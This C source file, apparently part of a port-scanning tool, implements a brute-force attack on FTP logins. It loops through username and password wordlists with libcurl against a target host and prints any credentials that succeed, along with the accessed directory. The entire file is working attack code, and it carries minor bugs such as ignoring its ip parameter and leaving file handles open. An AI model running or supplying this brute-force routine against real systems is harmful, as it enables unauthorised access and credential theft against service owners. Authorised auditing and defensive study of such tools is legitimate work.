/*
 ============================================================================
 Name        : Hack_port_21.c
 Author      : L.
 Version     : 1.0.5
 Copyright   : GNU General Public License v3.0
 Description : Hack Port 21
 ============================================================================
 */

#include "TCP_Syn_Port_Scanner.h"

struct memory {
	char *response;
	size_t size;
};

static size_t callback(void *data, size_t size, size_t nmemb, void *userp){
	size_t realsize = size * nmemb;
	struct memory *mem = (struct memory *)userp;
	char *ptr = realloc(mem->response, mem->size + realsize + 1);
	if(ptr == NULL){
		show_error("Out of Memory",0);
		return -1;
	}
	mem->response = ptr;
	memcpy(&(mem->response[mem->size]), data, realsize);
	mem->size += realsize;
	mem->response[mem->size] = 0;
	return realsize;
}

int hack_ftp(in_addr_t ip, int port){
	curl_global_init(CURL_GLOBAL_ALL);
	char url[50]="";
	snprintf(url,sizeof(url),"ftp://%s:%d/",inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)), port);
	CURL *mCurl=curl_easy_init();
	printf("\nTrying to perform connections by using brute force...\n\n");
	printf("%s",BLUE);
	double totalComb=0, cont=0;
	int i=0, timeouts=0;
	FILE *f=NULL;
	int totalUsernames=0;
	if((totalUsernames=open_file("usernames_FTP_SSH.txt",&f))==-1){
		show_error("Opening usernames_FTP_SSH.txt file error",errno);
		return -1;
	}
	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
	for (i=0;i<totalUsernames;i++) usernames[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
	int totalPasswords=0;
	if((totalPasswords=open_file("passwords_FTP.txt",&f))==-1){
		show_error("Opening passwords_FTP.txt file error", errno);
		return -1;
	}
	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
	for (i=0;i<totalPasswords;i++) passwords[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
	totalComb=totalUsernames*totalPasswords;
	int abort=FALSE;
	char *ftpEntryPath=NULL;
	struct memory chunk = {0};
	CURLcode res;
	if (mCurl){
		for(i=0;i<totalUsernames && timeouts<BRUTE_FORCE_TIMEOUT && abort==FALSE;i++){
			for(int j=0;j<totalPasswords && timeouts<BRUTE_FORCE_TIMEOUT && abort==FALSE;j++,cont++){
				printf("\rPercentaje completed: %.4lf%% (%s/%s)               ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
				fflush(stdout);
				usleep(BRUTE_FORCE_DELAY);
				curl_easy_setopt(mCurl, CURLOPT_URL, url);
				curl_easy_setopt(mCurl, CURLOPT_WRITEFUNCTION, callback);
				curl_easy_setopt(mCurl, CURLOPT_WRITEDATA, (void *)&chunk);
				curl_easy_setopt(mCurl, CURLOPT_TIMEOUT, 10L);
				curl_easy_setopt(mCurl, CURLOPT_USERNAME, usernames[i]);
				curl_easy_setopt(mCurl, CURLOPT_LOGIN_OPTIONS, "AUTH=*");
				curl_easy_setopt(mCurl, CURLOPT_PASSWORD, passwords[j]);
				res = curl_easy_perform(mCurl);
				curl_easy_reset(mCurl);
				if(res == CURLE_OK){
					curl_easy_getinfo(mCurl, CURLINFO_FTP_ENTRY_PATH, &ftpEntryPath);
					printf("%s",HRED);
					printf("\n\nLoging successfull with user: %s, password: %s. Service Vulnerable\n\n",usernames[i], passwords[j]);
					printf("Directory accessed: %s\n\n",ftpEntryPath);
					printf("%s\n\n", chunk.response);
					printf("%s",BLUE);
				}else{
					switch(res){
					case 67:
						break;
					case 28:
						timeouts++;
						break;
					default:
						printf("libcurl error: %d (%s)\n", res,curl_easy_strerror(res));
						abort=TRUE;
						break;
					}
				}
			}
		}
	}else{
		printf("Error curl initialization\n");
	}
	if(timeouts==3) printf("\n\nBrute Force hacking aborted by timeouting");
	curl_easy_cleanup(mCurl);
	curl_global_cleanup();
	printf("%s",DEFAULT);
	return 0;
}
